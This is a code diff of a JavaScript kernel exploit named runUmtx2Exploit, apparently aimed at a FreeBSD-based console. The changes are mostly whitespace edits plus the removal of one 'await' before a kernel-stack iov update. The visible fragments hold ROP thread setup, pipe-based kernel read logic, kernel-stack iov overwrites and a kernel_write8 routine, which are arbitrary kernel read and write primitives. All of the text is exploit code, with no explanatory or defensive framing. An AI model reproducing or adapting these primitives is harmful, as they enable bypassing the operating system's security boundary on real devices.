@@ -237,9 +237,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
      * @param {number} branch_type 
      * @param {int64|number} compare_value 
      */
-
-
-    function threadWaitWhile(thread, addr, branch_type, compare_value, dereference_compare_value = false, yield = true) {
+     function threadWaitWhile(thread, addr, branch_type, compare_value, dereference_compare_value = false, yield = true) {
         thread.while(addr, branch_type, compare_value, dereference_compare_value, () => {
             if (yield) {
                 thread.self_healing_syscall(SYS_SCHED_YIELD);
@@ -312,6 +310,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         cpu: alloc(0x8),
         fd: alloc(0x8)
     };
+
     const lookupThread = new thread_rop(p, chain, "rop_thread_lookup");
 
     function resetLookupThreadState() {
@@ -430,7 +429,6 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
 
         destroyerThread0.push_write4(destroyerThread0Data.status, threadStatus.EXITED);
     };
-
 
     function resetdestroyerThread1Rop() {
         resetDestroyerThread1State();
@@ -644,7 +642,6 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
             return;
         }
     }
-
 
     async function checkMemoryAccess(addr, checkSize = 1) {
         const pipesBuf = alloc(0x8);
@@ -1101,8 +1098,6 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         p.write4(kstack.add32(stackIovOffset + SIZE_IOV + OFFSET_UIO_SEGFLG), uioSegflg);
     }
 
-
-
     const PHYS_PAGE_SIZE = 0x1000;
 
     const kstackKrwReadBuf = alloc(0x8);
@@ -1117,8 +1112,8 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         p.write8(kprimCommonData.cmd, kstackKernelRwCmd.READ_QWORD);
         await new Promise((resolve) => setTimeout(resolve, 15)); // wait a while until kernel stack is populated
 
-        await updateIovInKstack(pipe_buf, kaddr, 1, 1, 8);
-
+        updateIovInKstack(pipe_buf, kaddr, 1, 1, 8);
+        
         await chain.syscall(SYS_READ, pipeSlowReadFd, pipe_buf, PIPE_SIZE); // read garbage
 
         while (p.read4(kprimCommonData.cmd) != kstackKernelRwCmd.NOP) {
@@ -1310,11 +1305,6 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         chain.self_healing_syscall_2(SYS_WRITE, pipeWrite, false, src, extraDereferenceSrc, length);
     }
     chainPushCopyin.value = new int64(0x00000000, 0x40000000);
-
-
-
-
-
 
     const krw_qword_store = p.malloc(0x8, 1);
     async function kernel_write8(kaddr, val) {
